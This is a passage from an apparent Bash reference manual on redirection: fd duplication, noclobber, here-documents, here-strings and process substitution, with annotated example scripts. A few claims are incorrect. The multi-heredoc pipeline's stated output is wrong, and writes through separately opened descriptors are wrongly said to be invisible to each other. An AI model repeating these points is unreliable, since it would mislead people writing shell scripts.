shopt -s inherit_errexit shift_verbose extglob nullglob

# Open /etc/hostname on fd 3 for reading; leave stdin attached to terminal
exec 3</etc/hostname

# Read one line from fd 3 specifically, not from default fd 0
read -r -u 3 hostline
printf 'hostname=%s\n' "$hostline"

# Re-read by duplicating fd 3 onto fd 0 for a single command
read -r line2 <&3
printf 'next=%s\n' "${line2:-<eof>}"

# Close fd 3 explicitly (or rely on EXIT trap — BCS0110)
exec 3<&-
```

`exec 3<file` is the canonical "open this side input once" idiom; the
BCS rule is to pair every `exec n<…` with an explicit close, ideally
via an `EXIT` trap (BCS0110).

### `read -u` versus `<` and `<&`

- `read -u 3 var` — read from fd 3 (does not touch fd 0).
- `read var <&3` — duplicate fd 3 onto fd 0 *for this `read`*, then
  read from fd 0. Functionally equivalent for a single read, but
  `-u` is clearer and avoids the temporary dup.
- `read var < file` — fresh open of *file* for this `read` only;
  always starts from byte 0. Not useful for multi-line iteration.

### Loop pattern — `while … do … done < file`

The standard "read every line of a file" loop attaches the redirection
to the `done` keyword, not to `read`:

```bash
# scenario: line-by-line file reading without subshell loss (§6.16, BCS0905)
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -i count=0
while IFS= read -r line; do
  count+=1
  printf '%4d: %s\n' "$count" "$line"
done < /etc/hostname
printf 'lines read: %d\n' "$count"
```

Quoting `IFS=` and using `-r` are the two BCS-mandated parts of the
idiom (BCS1003, BCS0905). Attaching redirection to `done` keeps the
loop body in the *current shell*, so `count` survives the loop —
contrast with `cat file | while read …`, which puts the loop in a
pipeline subshell where any modification is lost.

### BCS posture

- Use `read -u N` rather than `read … <&N` for clarity.
- Pair every `exec n<file` with `trap 'exec n<&-' EXIT` (BCS0110).
- Quote filenames in redirections: `< "$file"` (BCS0301).
- For looped line reading, prefer `while … done < file` over piping
  through `cat` (BCS0905, §6.16).

**See also**: §6.3 (output redirection), §6.5 (read+write `<>`),
§6.6 (duplicating fds), §6.7 (moving and closing), §6.8
(here-documents), §6.9 (here-strings).

## 6.3 Output redirection

Operators that connect an fd to an output destination. Default fd is
1 (stdout); fd 2 (stderr) requires the explicit `2>` form. The most
useful Bash extensions over POSIX are the combined `&>` / `&>>`
shorthands, which compile in the parser to a single safe ordering
(§6.4).

### Operator cheatsheet

| Operator | Meaning |
|----------|---------|
| `> file` | truncate-or-create *file*; open on fd 1 for writing |
| `n> file` | as above on fd *n* |
| `>> file` | append to *file*; create if needed; fd 1 |
| `n>> file` | append on fd *n* |
| `>\| file` | force overwrite even with `set -o noclobber` |
| `>&n`, `n>&m` | duplicate (§6.6) |
| `>&-`, `n>&-` | close fd |
| `&> file` | shorthand for `>file 2>&1` (single-token, safe ordering) |
| `&>> file` | shorthand for `>>file 2>&1` |

### `noclobber`, append, and `&>` — the three axes

These three operator families intersect frequently. `noclobber`
(`set -o noclobber`, BCS-recommended for production scripts) makes
plain `>file` *fail* if the file exists; `>|` is the explicit
override; `>>` always appends regardless of noclobber:

```bash
# scenario: noclobber + truncate + append + combined-redirect precedence
#!/usr/bin/env bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob
set -o noclobber                           # protect against accidental truncation

declare -r LOG=/tmp/out.$$
: > "$LOG"                                 # initial create  (rc 0)

# 1. noclobber refuses to truncate an existing file
echo 'a' > "$LOG" 2>err || true
grep -q 'cannot overwrite existing file' err && echo 'noclobber refused'
# ⇒ noclobber refused

# 2. >| forces the truncation
echo 'b' >| "$LOG"                         # rc 0 — explicit override
cat -- "$LOG"                              # ⇒ b

# 3. >> appends without conflict
echo 'c' >> "$LOG"
cat -- "$LOG"                              # ⇒ b<NL>c

# 4. &> truncates and merges stderr → stdout in one parser-level operation.
#    Equivalent to `>file 2>&1` with the *correct* ordering — never the wrong one.
{ echo to-stdout; echo to-stderr >&2; } &> "$LOG"
cat -- "$LOG"
# ⇒ to-stdout
# ⇒ to-stderr

# 5. &>> appends both streams (no truncation)
{ echo append-1; echo append-2 >&2; } &>> "$LOG"
wc -l < "$LOG"                             # ⇒ 4
```

### Why `&>` is preferred over `>file 2>&1`

The two are semantically equivalent only when the operators appear in
the right order. `&>file` is a parser shorthand: there is no
left-to-right ambiguity, no chance of writing the wrong-order form
`2>&1 >file`. BCS0711 promotes `&>` for the common "everything to
this destination" case; the manual `>file 2>&1` is reserved for cases
where stdout and stderr need *different* destinations (§6.4).

### Truncation semantics

`>file` opens the file with `O_WRONLY|O_CREAT|O_TRUNC`, **before** the
left-hand command runs. This bites a common idiom:

```bash
# scenario: in-place pipeline truncates BEFORE reading — wrong
sort -u < /tmp/list > /tmp/list      # ✗ wipes the file before sort starts

# right — write to a temp and rename atomically (BCS1006)
declare -- tmp; tmp=$(mktemp)
sort -u < /tmp/list > "$tmp" && mv -- "$tmp" /tmp/list
```

`>>file` does not truncate; it positions at end-of-file at every
write, which is safe for concurrent appends (under POSIX `O_APPEND`
atomicity, modulo write size).

### BCS posture

- Use `&>` for "send everything to this file" and `&>>` for "append
  everything" — single-operator forms eliminate the order trap
  (BCS0711, §6.4).
- Run with `set -o noclobber` in production scripts; use `>|` only
  when explicit overwrite is intentional (BCS0905-adjacent).
- Never write the in-place `cmd < file > file` pattern — use a temp
  + atomic rename (BCS1006).
- Quote filenames: `> "$LOG"` (BCS0301).

**See also**: §6.2 (input redirection), §6.4 (stderr merging and the
order rule), §6.6 (duplicating fds), §6.11 (order of evaluation),
§6.12 (`exec` for fd manipulation), §12.6 (cleanup traps).

## 6.4 Stderr redirection and merging

Bash provides explicit forms for redirecting stderr (`2>`, `2>>`, `2>&1`,
`1>&2`) plus two combined shorthands (`&>`, `&>>`). All resolve, after
parsing, to the same `dup2()` / `open()` syscall sequence the kernel
sees. The trap is that the order of operators is significant — `>file
2>&1` and `2>&1 >file` differ in result, not just style. This chapter
documents each form and traces the order-of-evaluation gotcha that bites
new authors.

### The operator inventory

- `2> file` — redirect stderr to *file* (truncate or create, fd 2).
- `2>> file` — append stderr to *file* on fd 2.
- `2>&1` — make fd 2 a duplicate of fd 1's *current* target.
- `1>&2` — make fd 1 a duplicate of fd 2's *current* target.
- `>file 2>&1` — both stdout and stderr to *file*. Idiomatic order.
- `2>&1 >file` — stderr to whatever fd 1 *was* (terminal), stdout to
  *file*. A common mistake.
- `&> file` — combined shorthand; equivalent to `>file 2>&1`.
- `&>> file` — combined-append shorthand.
- `2> >(cmd)` — pipe stderr through a process substitution (§6.10).

### Order-of-evaluation gotcha

Redirections are applied left-to-right against the current fd table
(§6.11). `2>&1` does not "merge" — it copies whatever fd 1 *currently*
points at into fd 2. Trace each form one operator at a time:

```bash
# scenario: contrast `>file 2>&1` (correct) with `2>&1 >file` (wrong)
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

# Correct order — file gets both streams
{ echo to-stdout; echo to-stderr >&2; } >out.log 2>&1
#   ^^^^^^^^^^^   step 1: open out.log on fd 1
#                  step 2: dup fd 1 (now out.log) onto fd 2
#                  ⇒ both streams land in out.log

# Wrong order — same operators, different sequence, terminal sees stderr
{ echo to-stdout; echo to-stderr >&2; } 2>&1 >out2.log
#   ^^^^^^^^^^^   step 1: dup fd 1 (still terminal) onto fd 2
#                  step 2: open out2.log on fd 1
#                  ⇒ stdout to file, stderr stays on terminal
```

The mnemonic: *first say where stdout goes, then say "stderr follows
stdout"*. Reverse it and the duplication has captured stale state.

### `&>` and `&>>` — atomic combined forms

Bash provides `&>file` and `&>>file` as parser-level shorthands that
*compile* to the correct ordering — there is no left-to-right pitfall
because the operator names a single combined operation:

```bash
# scenario: the three equivalent forms for "send everything to log"
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

cmd >log 2>&1                     # explicit, ordered
cmd &> log                        # bash-only shorthand (recommended)
cmd 1>log 2>log                   # WRONG — two separate opens, two offsets,
                                  # output may interleave or one stream
                                  # may overwrite the other's bytes
# ⇒ first two equivalent; third races on shared file
```

The third form (`1>log 2>log`) is a common over-clever attempt: each
operator opens the file independently, so each fd has its own write
offset and the streams race. Use `&>` or `>file 2>&1`.

`&>>` likewise appends both streams atomically — the file is opened
once with `O_APPEND`, and both fds share that one open file
description, so writes from either fd advance the kernel-side offset
correctly (BCS0711).

### Common idioms

- Discard both streams: `cmd &>/dev/null`.
- Capture both into a variable: `output=$(cmd 2>&1)`.
- Capture stdout into a variable, leave stderr on terminal:
  `output=$(cmd)` — the default; stderr is *not* captured by `$()`.
- Send stderr only to a file, leave stdout on terminal:
  `cmd 2>err.log` — stderr alone has its own operator.
- Swap streams (pipe stderr but not stdout): `cmd 3>&1 1>&2 2>&3 3>&-`
  — the classic stream-swap dance, see §6.6.
- Pipe stderr into a downstream filter while keeping stdout on
  terminal: see the swap dance above; alternatively
  `cmd 2> >(filter >&2)` if a process-substitution sink suffices
  (§6.10).

### Why `&>` is preferred for "everything to one place"

`>file 2>&1` is portable, explicit, and correct, but its three-token
shape invites the reversed-order error. `&>file` is a single bash
parser-recognised operator: there is no left-to-right reordering
hazard, no chance of accidentally inserting another redirection
between the two pieces, and the reader's eye sees one operation.
Likewise `&>>file` for the append case. BCS0711 codifies this
preference for combined redirection.

**See also**: §6.3 (output redirection), §6.6 (duplicating fds), §6.11
(order of evaluation), §6.14 (`|&` pipeline form), §7.2 (BCS0702 stdout
vs stderr separation), BCS0601, BCS0703, BCS0711.

## 6.5 Reading and writing (`<>`)

The `<>` operator opens a file for both reading and writing on a single
fd, with `O_RDWR | O_CREAT` semantics — the file is created if absent,
not truncated if present, and a single shared offset advances on both
reads and writes. It is the rarest of bash's redirection operators and
the only one that admits read-modify-write patterns on regular files
without an intermediary process.

### Forms

- `<> file` — open *file* on fd 0 (stdin) for read+write.
- `n<> file` — open on fd *n* (the form normally used).
- `{var}<> file` — Bash 5.0+ allocates a free fd into *var*.
- File created if missing; existing content preserved (no truncation).
- Single offset, shared between read and write — `read` advances it,
  `printf` advances it.

### Comparison with separate-fd alternatives

The temptation is to use `<file` and `>file` separately and trust the
filesystem to keep them coherent. It does not: opening the same path
twice produces two open file descriptions, each with its own offset,
and writes through one are not visible through the other until the
file is closed and re-opened. `<>` is the only operator that gives a
single offset shared between read and write.

### Read-modify-write demonstration

The use case is a long-lived fd that supports both `read` and `printf`
without re-opening. A typical pattern is incremental log scanning or
fixed-record state files:

```bash
# scenario: open state file once, read counter, write incremented value
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -- statefile='counter.dat'
[[ -f $statefile ]] || printf '0\n' >"$statefile"   # seed if absent

exec 7<>"$statefile"            # fd 7 open for read+write
read -r -u 7 current            # read current value (offset advances)
declare -i n=$((current + 1))
exec 7>&-                       # close to release lock semantics

# Re-open with truncation to write the new value
printf '%d\n' "$n" >"$statefile"
echo "incremented to $n"        # ⇒ incremented to 1 (then 2, then 3 …)
```

Note: `<>` does *not* truncate, so naively writing a shorter value back
into the same offset leaves stale bytes after the new content. For
scalar state, re-open with `>` for the write phase, as above. For
fixed-width record updates (e.g. binary tables), `<>` plus precise
seek-via-`read -N` is the right tool.

### Caveats

- No `lseek` builtin — bash cannot rewind an `<>`-opened fd. To re-read
  from the start, close and re-open.
- Pipes and FIFOs accept `<>` but the semantics are different: opening
  a FIFO with `<>` succeeds without blocking on either end, useful as a
  producer + consumer self-test pattern (the `<>` open does not require
  a counterparty to already be present).
- Bash 5.0+ accepts `{var}<>file` to allocate a fresh fd into the
  variable rather than naming one explicitly; combine with
  `shopt -s varredir_close` (§6.12) for automatic cleanup at variable
  scope exit.
- Most bash scripts have no need for `<>`; use `<` for input and `>`
  for output unless you need a single fd to do both. Reach for it when
  the alternative would be re-opening the same path many times in a
  loop.

For scalar incremental updates, the standard pattern remains
"open `<>`, read, close, re-open `>`, write" — `<>` provides
read-side persistence without committing to the awkward in-place
overwrite semantics the operator strictly offers.

**See also**: §6.2 (input redirection), §6.3 (output redirection), §6.6
(dup), §6.12 (`exec` for persistent fds), §17.x (FIFOs as IPC).

## 6.6 Duplicating fds

`>&` and `<&` duplicate one fd onto another. The mechanism is `dup2()`:
the destination fd ends up referring to the same open file description
as the source — same file, same offset, same status flags. Closing
either does not close the other; they are independent handles to the
shared description.

### Forms

- `n>&m` — make fd *n* a duplicate of fd *m* for writing.
- `n<&m` — same, expressed for reading (parses identically).
- `>&m` — equivalent to `1>&m`.
- `<&m` — equivalent to `0<&m`.
- `n>&m-` — duplicate-and-close: dup *m* onto *n*, then close *m*
  atomically (see §6.7).
- `n>&-` — close fd *n* (see §6.7).
- `{var}>&m` — Bash 5.0+ allocates a fresh fd, stores its number in
  *var*, and points it at *m*'s description. Useful when the script
  must not collide with a hard-coded fd number.

The two parser forms `>&` and `<&` are identical at the dup2 level —
both perform the same `dup2(m, n)` syscall regardless of whether the
operator is written for reading or writing. Bash uses the parser
direction only to decide what message to emit on error; the underlying
operation is symmetric.

The duplicated fd shares the *open file description*, not just the
target. Two consequences matter:

1. **Shared offset.** Writes through fd 1 and fd 3 (where `3>&1`) advance
   the same kernel-side offset; bytes do not interleave on a per-fd
   basis.
2. **Independent close.** `exec 1>&-` does not close fd 3 even though it
   was created by `3>&1` — both must be closed explicitly.

### Save-restore-stdout pattern

The canonical use of duplication is the "save current stdout, redirect,
restore" dance. Save fd 1 onto an unused fd (3 by convention), apply
the temporary redirection, then restore by duplicating back:

```bash
# scenario: wrap a function call so its stdout is captured to a log,
# leaving everything else on the terminal untouched
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

run_quiet_with_log() {
  local -- logfile="$1"; shift
  exec 3>&1                     # save current stdout on fd 3
  exec 1>"$logfile"             # stdout now goes to logfile
  "$@"                          # run the command — its stdout goes to log
  exec 1>&3                     # restore stdout from saved fd 3
  exec 3>&-                     # close the saved fd
}

run_quiet_with_log /tmp/build.log make all
echo "build done"               # ⇒ printed to terminal as expected
# /tmp/build.log contains only `make all` stdout
```

The two `exec` lines in the middle could collapse to `exec 3>&1 1>"$logfile"`
and the restore to `exec 1>&3 3>&-` — bash applies redirections
left-to-right within a single `exec`, so the save happens before the
overwrite. See §6.11 for the ordering rule.

### Stream-swap (the awk classic)

Sometimes a command's stdout is uninteresting but its stderr should be
captured for further pipeline processing. Naively `cmd 2>&1 | grep` only
works if both streams are wanted; to swap them — pipe stderr, leave
stdout on terminal — use a three-way dance:

```bash
# scenario: pipe stderr through a grep filter, keep stdout on terminal
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

# Three-fd swap: 3 ← 1 ← 2 ← 3, then close 3
{ make 3>&1 1>&2 2>&3 3>&-; } | grep -i error
# step-by-step at the brace:
#   3>&1   fd 3 ← terminal-stdout
#   1>&2   fd 1 ← terminal-stderr (so make's stdout goes to stderr)
#   2>&3   fd 2 ← saved terminal-stdout (so make's stderr goes to stdout
#                 → the pipe → grep)
#   3>&-   close the temporary
# ⇒ grep sees `make`'s stderr; `make`'s stdout still appears on terminal
```

This is the only standard idiom; memorise the four-operator form rather
than re-deriving it.

### Difference from move

`n>&m` *duplicates*: fd *m* remains open. `n>&m-` *moves*: fd *m* is
closed atomically once *n* has been pointed at the description (§6.7).
For passing exactly the fds a child process needs, the move form avoids
fd leaks.

### Why fd 3 (and not 4, 5, 9 …)

Convention reserves fds 3–9 for user code; bash itself may open higher
fds for internal bookkeeping. Within that range, fd 3 is the
overwhelmingly common choice for save-stdout, fd 4 for save-stderr.
Pick stable conventions within a script and document them in the
header comment — readers (and `bash -x` traces) become much easier to
follow when fd 3 *always* means "saved stdout" rather than rotating
between fd 3, 4, and 5.

`exec {var}>file` (Bash 5.0+) sidesteps the convention entirely: bash
allocates a free fd and stores the number in *var*. Combine with
`varredir_close` (§6.12) to make fd lifetime track variable scope.

When in doubt, write the redirection list with comments tracing each
operator's effect on the fd table — bash's terse syntax rewards
explicit narration in places where the syscall semantics matter.

**See also**: §6.7 (moving and closing fds), §6.11 (order of evaluation),
§6.12 (`exec` for fd manipulation), §1.2 (fd table from the kernel's
perspective), BCS0703 (messaging fds).

## 6.7 Moving and closing fds

The close form `>&-` (and `<&-`) shuts an fd; the dup-and-close form
`n>&m-` *moves* an fd — duplicates *m* onto *n* and closes *m* in a
single operation. The two forms together let a script manage fd
lifetimes precisely, which matters when launching children that should
see only the fds they need.

### Closing forms

- `>&-` — close fd 1.
- `<&-` — close fd 0.
- `n>&-` — close fd *n* (write side).
- `n<&-` — close fd *n* (read side; equivalent to `n>&-`, only the
  parser direction differs).
- `exec 4>&-` — script-wide close of fd 4.

Closing an fd that is *already* closed is silently fine. Writing to a
closed fd is *not*: the write fails with EBADF and bash reports a
"Bad file descriptor" error. Reading similarly returns EBADF.

### Move (atomic dup-and-close)

`n>&m-` and `n<&m-` perform `dup2(m, n)` followed by `close(m)`
atomically — there is no intermediate state where both fds reference the
same description. The use case is fd hygiene: a child process inherits
*every* fd that is open at exec time unless the parent has marked it
`O_CLOEXEC` or closed it, so a long-lived saved-stdout on fd 3 leaks
into every child unless explicitly cleaned up.

```bash
# scenario: redirect this whole script's stdout to a log, restore at end
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

# Save stdout on 3, point fd 1 at the log
exec 3>&1 >script.log

echo "this line goes to the log"
date
echo "more log output"

# Restore stdout via move: fd 1 ← fd 3, fd 3 closed atomically
exec 1>&3-
echo "this line is back on the terminal"
# ⇒ this line is back on the terminal
# (script.log now holds three lines; fd 3 is no longer dangling)
```

Without the `-` suffix on `1>&3`, fd 3 would remain open through the
rest of the script's lifetime, inherited by every child the script
spawns. The move form is the correct cleanup.

### Close-then-write and SIGPIPE-equivalent failures

Closing fd 1 and then writing to it does not raise SIGPIPE — that
signal is for *pipe* readers that have departed, not for closed fds.
Writes to a closed fd return EBADF; the calling builtin (typically
`echo`, `printf`) prints an error to fd 2 (if 2 is still open) and
returns non-zero:

```bash
# scenario: close stdout, attempt to write — observe failure mode
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

(
  exec 1>&-                     # close stdout in this subshell only
  echo "no destination"         # write to closed fd 1
) 2>&1 || echo "subshell failed: $?"
# ⇒ Bad file descriptor
# ⇒ subshell failed: 1
```

For the SIGPIPE case proper — a *living* writer feeding a *dead*
reader — see §6.13 and §13.5; the disposition is signal 13 with default
exit status 141, not EBADF.

### Practical guidance

- Always pair an `exec n>&1` save with a matching `exec 1>&n-` (move,
  not dup) restore. The trailing hyphen is the difference between
  hygienic and leaky scripts.
- For a `func() { … } 3>&1` style — fd 3 is local to the function call,
  so explicit close is unnecessary; the redirection is undone on
  return.
- When launching a long-running background child that should not
  inherit a debugging fd, `bg-cmd 3>&-` closes fd 3 just for that
  child. Without the close, the child holds the fd open and the
  description outlives the parent's intent.
- `shopt -s varredir_close` (Bash 5.2, §6.12) automates cleanup for
  fds opened via the `{var}>file` form — the fd closes when *var*
  goes out of scope. Recommended for all new code that opens custom
  fds inside a function.

**See also**: §6.6 (duplicating fds), §6.12 (`exec` and `varredir_close`),
§6.13 (pipelines and SIGPIPE), §13.5 (`pipefail` and 141), §11.2 (fd
inheritance at fork).

## 6.8 Here-documents

A here-document synthesises stdin from inline text. The form is
`cmd <<DELIM`, followed by lines of body text, terminated by a line
containing exactly *DELIM* with no leading or trailing whitespace
(unless `<<-` is used). Whether the body undergoes expansion depends
entirely on the *quoting of the delimiter*; this is the rule most often
mis-remembered.

### Forms

- `<<DELIM` — body undergoes parameter, command, and arithmetic
  expansion before being delivered to *cmd*.
- `<<'DELIM'`, `<<"DELIM"`, `<<\DELIM` — body is delivered *literally*,
  no expansions performed. Single quotes, double quotes, and a
  backslash-escaped delimiter are all equivalent here-doc-quoting forms.
- `<<-DELIM` — *leading tab characters* (and only tabs, not spaces) are
  stripped from each body line and from the closing delimiter line. The
  hyphen lets the body be indented within an `if` / function block
  without the indentation appearing in the synthesised input.
- `<<-'DELIM'` — combine: tab-strip *and* no expansion.

### Quoted vs unquoted delimiter — the most-missed rule

Trace the same here-doc body through both quoting forms:

```bash
# scenario: same body, different delimiter quoting → very different output
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -- name='Biksu'

cat <<UNQUOTED
Hello, $name. Today is $(date +%Y-%m-%d).
UNQUOTED
# ⇒ Hello, Biksu. Today is 2026-05-03.

cat <<'QUOTED'
Hello, $name. Today is $(date +%Y-%m-%d).
QUOTED
# ⇒ Hello, $name. Today is $(date +%Y-%m-%d).
```

The single-quoted form is essential for embedding scripts, SQL, awk
programs, or anything containing literal `$` or backslashes. Forget it
and a stray `$path` in the body becomes the empty string at the worst
possible moment (BCS0304).

### `<<-` and the tab-strip rule

`<<-` strips *only tabs*, not spaces. Mixed indentation defeats it
silently — the tabs are stripped, the spaces remain, and the input has
ragged left-margin whitespace that breaks tools expecting fixed
formatting (Python, indent-sensitive YAML, …):

```bash
# scenario: indented heredoc inside a function — `<<-` strips leading tabs
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

emit_config() {
        # NOTE: leading whitespace on body lines must be TABS, not spaces
        cat <<-'EOF'
	[server]
	host = localhost
	port = 8080
	EOF
}

emit_config
# ⇒ [server]
# ⇒ host = localhost
# ⇒ port = 8080
```

Editor configuration matters: many "soften tabs to spaces" settings
silently break `<<-`. The bash convention is to leave heredoc bodies
flush against column 1 in source, accepting the reduced visual nesting,
*unless* the script's editorconfig pins tab characters specifically.

### Multiple here-docs in one pipeline

Each component of a pipeline may have its own here-doc; they are queued
left-to-right and dispatched to the matching command:

```bash
# scenario: two here-docs, one per pipeline component
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

cat <<EOF1 | tr a-z A-Z | cat <<EOF2 - <<EOF3
first heredoc, lowered
EOF1
prologue
EOF2
epilogue
EOF3
# ⇒ prologue
# ⇒ FIRST HEREDOC, LOWERED
# ⇒ epilogue
```

The middle component's `cat <<EOF2 - <<EOF3` reads `EOF2`, then stdin
(`-`, the upstream pipe), then `EOF3`. This pattern is rare in practice
but is the only way to splice fixed prologue/epilogue around piped
input without `printf`/`echo` boilerplate.

### Implementation note

Bash buffers the here-doc body, then on `exec` either writes it to a
temp file and opens that file as fd 0, or — for short bodies on modern
Linux — feeds it through an anonymous pipe. The size threshold is
implementation-defined; scripts should not depend on either path.

### Common sinks

Here-docs are the standard mechanism for feeding inline scripts to
secondary interpreters. The quoted-delimiter form is essential for any
sink that has its own `$` syntax — the entire point is that bash
*should not* expand the body:

- `cat <<'EOF' >script.py … EOF` — write a literal Python script.
- `mysql -uroot <<'SQL' … SQL` — feed a SQL batch unchanged.
- `awk -f /dev/stdin <<-'AWK' … AWK` — inline an awk programme.
- `ssh host bash <<'REMOTE' … REMOTE` — run a literal bash script on
  the remote host with no client-side expansion.

Conversely, the *unquoted* form is right when the script genuinely
wants bash-side substitution — e.g. injecting the value of a local
`$config_path` into an emitted config file before delivering to a
non-shell consumer. Choose deliberately; mistakes here are the
single most common heredoc bug.

**See also**: §6.9 (here-strings — single-line variant), §3.4 (BCS0304
heredoc quoting rules), §11.x (process exec semantics), §10.x
(redirection in functions).

## 6.9 Here-strings (`<<<`)

`<<<` is the single-line variant of a here-document: it supplies its
right-hand operand as stdin to the command, with one trailing newline
appended. It is faster, clearer, and avoids the subshell of an `echo |
cmd` pipeline — making it the preferred mechanism for short string
inputs to commands that read stdin.

### Forms

- `cmd <<<word` — *word* (undergoes the usual expansions) becomes
  stdin, with one `\n` appended.
- `cmd <<<"$var"` — quoted-expansion form; preserves embedded
  whitespace and special characters in *var*.
- `cmd <<<"$(producer)"` — command-substitution feed.

The right-hand side is a *word*, not a list of arguments — multi-line
content via `<<<` requires literal `$'\n'` escapes or a here-doc.

### Trailing-newline gotcha

Bash always appends one newline to the here-string contents. This is
why `read -r var <<<"$line"` works correctly — `read` needs a newline
to terminate the line — but it also means the byte count is
*one greater* than `${#line}`:

```bash
# scenario: trace the trailing-newline behaviour of `<<<` byte by byte
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -- text='abc'
declare -i n
n=$(wc -c <<<"$text")
echo "wc -c counted: $n"        # ⇒ 4   (3 body + 1 appended \n)

# Compare to printf without %s\n — no trailing newline
n=$(printf %s "$text" | wc -c)
echo "printf %s counted: $n"    # ⇒ 3
```

Most tools (`grep`, `awk`, `sed`, `tr`) treat the trailing newline as a
record terminator and so behave identically with both. Tools that count
bytes precisely (`wc -c`, `md5sum`, `sha256sum`) do *not*; account for
the extra byte when computing checksums of variable contents.

### `read -r var <<<` idiom

The most common use of `<<<` is single-line `read`. The newline that
terminates the read is exactly the one bash appends — no `printf`,
`echo`, or pipe is needed:

```bash
# scenario: split a colon-delimited string into named fields with `read`
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

declare -- record='42:Biksu:admin:/home/biksu'
declare -- uid name role home

IFS=: read -r uid name role home <<<"$record"

printf 'uid=%s name=%s role=%s home=%s\n' "$uid" "$name" "$role" "$home"
# ⇒ uid=42 name=Biksu role=admin home=/home/biksu
```

This is faster and clearer than the `echo` pipe alternative
(`echo "$record" | IFS=: read …`) and avoids the lastpipe / subshell
trap that the pipe form falls into (§6.16).

### When `<<<` is wrong

- Multi-line content: use `<<EOF` or `<<-'EOF'` instead.
- Binary content: `<<<` will mangle anything that needs the trailing
  newline absent; pipe from `printf '%b'` or use process substitution.
- Very large strings: the implementation copies the entire word into a
  temp file or pipe; for hundreds of KB or more, prefer a real file.

**See also**: §6.8 (here-documents), §5.6 (command substitution
trailing-newline strip), §3.4 (BCS0304 here-doc quoting), §10.x
(`read -r` patterns).

## 6.10 Process substitution as redirection

Process substitution (§5.7) is a redirection mechanism in disguise.
`<(cmd)` and `>(cmd)` resolve at parse time to a `/dev/fd/N` filename
that bash hands to the surrounding command, while spawning *cmd* as a
child process whose stdout (or stdin) is connected to that fd. The
calling command sees a path; the kernel sees a pipe. This dual
character makes process substitution the answer to several problems
that pipes cannot solve and that temp files solve only with explicit
cleanup.

### Forms

- `<(cmd)` — *cmd*'s stdout is delivered as a readable file
  (`/dev/fd/N`); the surrounding command opens it for input.
- `>(cmd)` — *cmd*'s stdin is delivered as a writable file; the
  surrounding command opens it for output.
- Multiple substitutions in one command line: each gets its own
  `/dev/fd/N` and its own background child.
- Lifetime: each child lives until the surrounding command finishes
  reading or writing and closes the fd.

### Multi-input commands — the `diff` idiom

Process substitution shines where a tool wants two file arguments and
the contents are computed, not stored. The classic case is comparing
the sorted output of two pipelines:

```bash
# scenario: compare sorted directory listings without intermediate temp files
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

# Set up two demo directory listings as input fixtures:
mkdir -p _enabled _available
: > _enabled/site-a.conf && : > _enabled/site-b.conf
: > _available/site-a.conf && : > _available/site-c.conf

diff <(ls -1 _enabled | sort) <(ls -1 _available | sort) || true
# ⇒ < site-b.conf
# ⇒ > site-c.conf
# (each sub-pipeline runs in parallel; fds are /dev/fd/63 and /dev/fd/62)
```

Without `<()`, the same effect requires two temp files, two `mktemp`
calls, and a trap to clean them up. Process substitution does it with
zero file system state.

### Tee-split-stdout-and-stderr — the canonical idiom

`>()` lets a command split its output streams to multiple sinks while
still appearing on the terminal. Combined with `tee`, this is the
standard "log everything" pattern for build scripts:

```bash
# scenario: capture stdout and stderr to separate logs while keeping both visible
#!/usr/bin/env bash
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

build_step() {
  echo 'progress: phase 1'
  echo 'warning: deprecated flag' >&2
  echo 'progress: phase 2'
  return 0
}

build_step \
  > >(tee build.out)    \
  2> >(tee build.err >&2)
wait                          # let the tee children flush before we read
# ⇒ progress: phase 1
# ⇒ progress: phase 2
# (build.out holds the two progress lines; build.err holds the warning,
#  which also re-appears on terminal stderr via the inner `tee … >&2`)
```

The `>&2` inside the second `tee` re-routes its stdout (which is
`tee`'s copy of the original stderr) back to the script's stderr,
preserving the visible-on-terminal property. Without it, the warning
would land on stdout from `tee`'s perspective, mingling streams.

### Exit-status nuance

The exit status of a process substitution is *not* propagated to `$?`:
the surrounding command's status is `$?`, while the substituted child's
status is invisible. Process substitution is therefore unsafe for
detecting failure of the substituted command. The standard
work-arounds:

```bash
# scenario: detect failure inside <( ) — which is otherwise silent
set -euo pipefail; shopt -s inherit_errexit shift_verbose extglob nullglob

# Pattern: write child's status into a sentinel file
declare -- sentinel; sentinel=$(mktemp)
trap 'rm -f "$sentinel"' EXIT

while read -r line; do
  echo "consumed: $line"
done < <(producer; printf '%s' "$?" >"$sentinel")

declare -i child_rc; child_rc=$(<"$sentinel")
((child_rc == 0)) || die 5 "producer failed: rc=$child_rc"
```

If `lastpipe` is enabled (§6.16), the simpler `producer | while read`
form delivers the producer's status directly via `PIPESTATUS[]` —
process substitution is necessary only when the consumer cannot run in
the pipeline tail (e.g. it must mutate enclosing scope variables in a
non-pipeline context).

### Lifetime and cleanup nuances

- The child of `<(cmd)` is reaped when the surrounding command closes
  its read fd. If the surrounding command never reads, the child is
  orphaned until script exit.
- `>(cmd)` similarly: the child waits on EOF on its stdin. A
  surrounding command that exits before flushing all its output to the
  `>()` substitute can lose late writes.
- Process substitution does *not* set `$!` — there is no PID variable
  exposed for the substituted child. To wait on it, you must `wait`
  for all background children or arrange a sentinel.
- Under `set -e`, a failed substituted child does not abort the script
  unless its status reaches `$?` via some other mechanism (e.g. the
  sentinel pattern above). This is the single biggest gotcha: a
  silently-failing `<(producer)` can deliver an empty stream, the
  consumer reports "no data", and the script proceeds as if all is
  well.

### Platform notes

Process substitution requires `/dev/fd` (Linux, macOS, BSD). On
